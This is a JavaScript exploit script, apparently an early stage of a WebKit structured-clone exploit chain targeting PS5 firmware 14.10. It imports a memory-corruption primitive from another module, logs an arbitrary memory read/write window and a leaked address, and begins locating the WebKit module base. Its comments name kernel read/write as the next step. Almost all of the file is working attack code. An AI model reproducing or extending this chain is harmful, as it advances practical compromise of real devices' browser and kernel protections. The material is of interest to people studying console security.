// Relapse WebKit structured clone exploit adapted for PS5 14.10
// Original by Jordy / ntfargo - adapted for 14.10 testing
import { establishPrimitive } from './webkit_core.js';

function log(msg) {
  var el = document.getElementById('log');
  if (el) el.textContent += msg + '\n';
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon?m=' + encodeURIComponent(msg), true);
    x.send();
  } catch(e) {}
}

log('Relapse: starting structured clone exploit...');

establishPrimitive(function(tag, detail, type) {
  log('SC[' + tag + ']: ' + detail);
}).then(function(memWindow) {
  log('SC: MEMORY WINDOW ESTABLISHED');
  log('SC: leak_addr=' + memWindow.leakAddress);
  log('SC: size=' + memWindow.size);

  // We have arbitrary memory read/write through memWindow
  // memWindow.setAddress(addr) - point the window at addr
  // memWindow.bytes - Uint8Array to read/write
  // memWindow.resetAddress() - restore original

  // Step 1: Find WebKit module base
  // The nativeConstructor address leaked during exploit setup
  // is inside the WebKit module
  var nativeCtor = globalThis.__ps5NativeCtor;
  if (nativeCtor) {
    log('SC: nativeConstructor=' + nativeCtor.toString(16));

    // Walk backwards to find module base (page-aligned)
    // WebKit base is typically at a 0x4000-aligned address on PS5
    var candidate = (nativeCtor & ~0x3FFF);
    log('SC: searching for WebKit base near ' + candidate.toString(16));
  }

  log('SC: EXPLOIT STAGE 1 COMPLETE - MEMORY R/W ACHIEVED');

  // Next: find libkernel, build kernel R/W
}).catch(function(err) {
  log('SC: FAILED - ' + err.message);
});
